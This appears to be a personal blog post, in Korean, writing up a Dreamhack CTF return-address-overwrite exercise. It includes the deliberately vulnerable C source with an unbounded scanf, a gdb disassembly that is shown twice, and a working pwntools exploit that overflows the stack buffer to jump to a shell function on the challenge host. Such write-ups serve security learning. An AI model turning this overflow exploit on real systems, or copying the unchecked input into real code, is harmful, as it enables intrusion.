@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ctf3 · Gahyun Baek</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Mono:wght@300;400&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/style.css">
+  <style>
+    .post-header { margin-bottom: 2.5rem; }
+    .post-header h1 {
+      font-family: 'DM Serif Display', serif;
+      font-size: 2rem; font-weight: 400; line-height: 1.2;
+      margin-bottom: .6rem;
+    }
+    .post-meta { display: flex; gap: .8rem; align-items: center; font-size: .78rem; color: var(--muted); }
+    .post-tag {
+      background: var(--tag); border-radius: 4px;
+      padding: .1rem .5rem; font-size: .72rem; color: var(--muted);
+    }
+    .post-body { line-height: 1.8; font-size: .95rem; }
+    .post-body h2 { font-family: 'DM Serif Display', serif; font-size: 1.3rem; font-weight: 400; margin: 2rem 0 .8rem; }
+    .post-body h3 { font-size: 1rem; font-weight: 600; margin: 1.5rem 0 .5rem; }
+    .post-body p  { margin-bottom: 1rem; color: var(--ink); }
+    .post-body ul { margin: .5rem 0 1rem 1.5rem; }
+    .post-body li { margin-bottom: .3rem; }
+    .post-body pre {
+      background: #1a1814; color: #f7f5f0;
+      border-radius: 6px; padding: 1.2rem;
+      overflow-x: auto; font-size: .82rem;
+      margin: 1.2rem 0;
+    }
+    .post-body code { font-family: 'DM Mono', monospace; }
+    .post-body p code {
+      background: var(--tag); border-radius: 3px;
+      padding: .1rem .35rem; font-size: .85em;
+    }
+    .post-body a { color: var(--accent); text-decoration: none; }
+    .post-body a:hover { text-decoration: underline; }
+    .back-link {
+      display: inline-flex; align-items: center; gap: .4rem;
+      font-size: .8rem; color: var(--muted); text-decoration: none;
+      margin-bottom: 2rem;
+      transition: color .2s;
+    }
+    .back-link:hover { color: var(--ink); }
+    hr.post-divider { border: none; border-top: 1px solid var(--line); margin: 2rem 0; }
+  </style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-logo" href="../../index.html">Gahyun Baek</a>
+  <ul class="nav-links">
+    <li><a href="../../index.html">Home</a></li>
+    <li><a href="../papers.html">Papers</a></li>
+    <li><a href="../posts.html">Posts</a></li>
+    <li><a href="../blog.html">Blog</a></li>
+    <li><a href="../cv.html">CV</a></li>
+  </ul>
+</nav>
+
+<main class="page">
+  <a class="back-link" href="../posts.html">
+    ← Back to Posts
+  </a>
+
+  <div class="post-header">
+    <h1>ctf3</h1>
+    <div class="post-meta">
+      <span>2026·03</span>
+      <span class="post-tag">CTF</span>
+    </div>
+  </div>
+
+  <hr class="post-divider">
+
+  <div class="post-body">
+<h2>문제</h2>
+
+<p><strong>Description</strong></p>
+
+<p>Exploit Tech: Return Address Overwrite에서 실습하는 문제입니다.</p>
+
+<pre><code class="language-powershell">
+┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0311]
+└─$ cat rao.c
+// Name: rao.c
+// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie
+
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+void init() {
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+}
+
+void get_shell() {
+  char *cmd = "/bin/sh";
+  char *args[] = {cmd, NULL};
+
+  execve(cmd, args, NULL);
+}
+
+int main() {
+  char buf[0x28];
+
+  init();
+
+  printf("Input: ");
+  scanf("%s", buf);
+
+  return 0;
+}
+</code></pre>
+
+<h2>해결</h2>
+
+<pre><code class="language-nasm">
+gef➤  disassemble main
+Dump of assembler code for function main:
+   0x00000000004006e8 &lt;+0&gt;:     push   rbp
+   0x00000000004006e9 &lt;+1&gt;:     mov    rbp,rsp
+   0x00000000004006ec &lt;+4&gt;:     sub    rsp,0x30
+   0x00000000004006f0 &lt;+8&gt;:     mov    eax,0x0
+   0x00000000004006f5 &lt;+13&gt;:    call   0x400667 &lt;init&gt;
+   0x00000000004006fa &lt;+18&gt;:    lea    rdi,[rip+0xbb]        # 0x4007bc
+   0x0000000000400701 &lt;+25&gt;:    mov    eax,0x0
+   0x0000000000400706 &lt;+30&gt;:    call   0x400540 &lt;printf@plt&gt;
+   0x000000000040070b &lt;+35&gt;:    lea    rax,[rbp-0x30]
+   0x000000000040070f &lt;+39&gt;:    mov    rsi,rax
+   0x0000000000400712 &lt;+42&gt;:    lea    rdi,[rip+0xab]        # 0x4007c4
+   0x0000000000400719 &lt;+49&gt;:    mov    eax,0x0
+   0x000000000040071e &lt;+54&gt;:    call   0x400570 &lt;__isoc99_scanf@plt&gt;
+   0x0000000000400723 &lt;+59&gt;:    mov    eax,0x0
+   0x0000000000400728 &lt;+64&gt;:    leave
+   0x0000000000400729 &lt;+65&gt;:    ret
+</code></pre>
+
+<pre><code class="language-nasm">
+gef➤  disassemble main
+Dump of assembler code for function main:
+   0x00000000004006e8 &lt;+0&gt;:     push   rbp
+   0x00000000004006e9 &lt;+1&gt;:     mov    rbp,rsp
+   0x00000000004006ec &lt;+4&gt;:     sub    rsp,0x30
+   0x00000000004006f0 &lt;+8&gt;:     mov    eax,0x0
+   0x00000000004006f5 &lt;+13&gt;:    call   0x400667 &lt;init&gt;
+   0x00000000004006fa &lt;+18&gt;:    lea    rdi,[rip+0xbb]        # 0x4007bc
+   0x0000000000400701 &lt;+25&gt;:    mov    eax,0x0
+   0x0000000000400706 &lt;+30&gt;:    call   0x400540 &lt;printf@plt&gt;
+   0x000000000040070b &lt;+35&gt;:    lea    rax,[rbp-0x30]
+   0x000000000040070f &lt;+39&gt;:    mov    rsi,rax
+   0x0000000000400712 &lt;+42&gt;:    lea    rdi,[rip+0xab]        # 0x4007c4
+   0x0000000000400719 &lt;+49&gt;:    mov    eax,0x0
+   0x000000000040071e &lt;+54&gt;:    call   0x400570 &lt;__isoc99_scanf@plt&gt;
+   0x0000000000400723 &lt;+59&gt;:    mov    eax,0x0
+   0x0000000000400728 &lt;+64&gt;:    leave
+   0x0000000000400729 &lt;+65&gt;:    ret
+</code></pre>
+
+<pre><code class="language-nasm">
+└─$ file rao
+rao: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=298450dfb7a0f975e175c8e70d1fff1fc1f5b116, not stripped
+</code></pre>
+
+<p>32 bit 가 아닌 64 bit 였다.</p>
+
+<pre><code class="language-python">
+┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0311]
+└─$ cat ex.py
+from pwn import *
+
+io = remote ("host3.dreamhack.games", 17781)
+
+# 32-bit 가 아닌 64 인 점을 간과했다
+# [rbp-0x30]
+# 이기 때문에 0x30 + 8-bit (rbp) + get_shell 의 시작 주소
+# 48 + 8 + p64(0x4006aa)
+payload = b"A" * 56 + p64(0x4006aa)
+
+io.recv(timeout=0.5)
+io.sendline(payload)
+io.interactive()
+</code></pre>
+  </div>
+</main>
+
+<script src="../../js/nav.js"></script>
+</body>
+</html>
